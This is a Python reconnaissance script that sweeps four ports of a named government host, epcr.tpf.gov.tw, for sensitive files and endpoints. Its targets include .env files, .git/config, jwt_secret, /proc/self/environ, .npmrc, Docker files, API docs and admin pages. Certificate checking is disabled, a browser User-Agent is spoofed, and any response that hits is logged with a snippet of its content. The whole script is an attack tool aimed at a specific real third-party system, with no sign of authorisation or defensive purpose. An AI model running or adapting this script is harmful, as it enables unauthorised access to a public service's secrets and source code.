import requests, urllib3, ssl
urllib3.disable_warnings()
S = requests.Session(); S.verify=False
H = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}

# config / source / sensitive paths
paths = [
 "/config","/config.js","/config.json","/configs","/configs/default.json","/conf.js",
 "/env","/.env","/.env.local","/.env.production","/server.js","/app.js","/app.json",
 "/main.js","/index.js","/index.json","/bootstrap.js","/startup.js","/routes.js",
 "/route.js","/api.js","/controllers","/controllers.js","/models","/models.js",
 "/middleware.js","/auth.js","/auth.json","/jwt.json","/jwt_secret","/secret",
 "/package.json","/package-lock.json","/.npmrc","/yarn.lock","/gulpfile.js",
 "/webpack.config.js","/.babelrc","/.eslintrc","/tsconfig.json","/Dockerfile",
 "/docker-compose.yml","/.dockerenv","/npm-debug.log","/debug.log","/.htaccess",
 "/.git/HEAD","/.git/config","/.git/index","/HEAD","/proc/self/environ",
 "/api/config","/api/env","/api/debug","/api/version","/api/health","/health","/healthz",
 "/status","/status.json","/version","/version.json","/info","/info.json","/metrics",
 "/swagger.json","/swagger","/swagger-ui.html","/docs","/redoc","/openapi.json",
 "/.DS_Store","/node_modules/.bin/","/node_modules/express/package.json",
 "/public/config","/dist/config","/static/config","/assets/config",
 "/Users","/Roles","/Permissions","/Roles","/login","/refreshToken","/config",
 "/admin","/admin/","/console","/wp-login.php",
]
for base in ["https://epcr.tpf.gov.tw:4000","https://epcr.tpf.gov.tw:4001",
             "https://epcr.tpf.gov.tw:4002","https://epcr.tpf.gov.tw:4004"]:
    print("\n########", base, "########")
    for p in paths:
        try:
            r = S.get(base+p, timeout=12, headers=H, allow_redirects=False)
            ct = r.headers.get("content-type","")
            # print only interesting: non-404/401/403, or json, or text with content
            if r.status_code in (200,201,204,301,302,307,500,501,502,503):
                print(f"{r.status_code:3} len={len(r.content):6} {ct[:28]:28} {p}  :: {r.text[:60].strip()!r}")
        except Exception as e:
            pass
print("done")
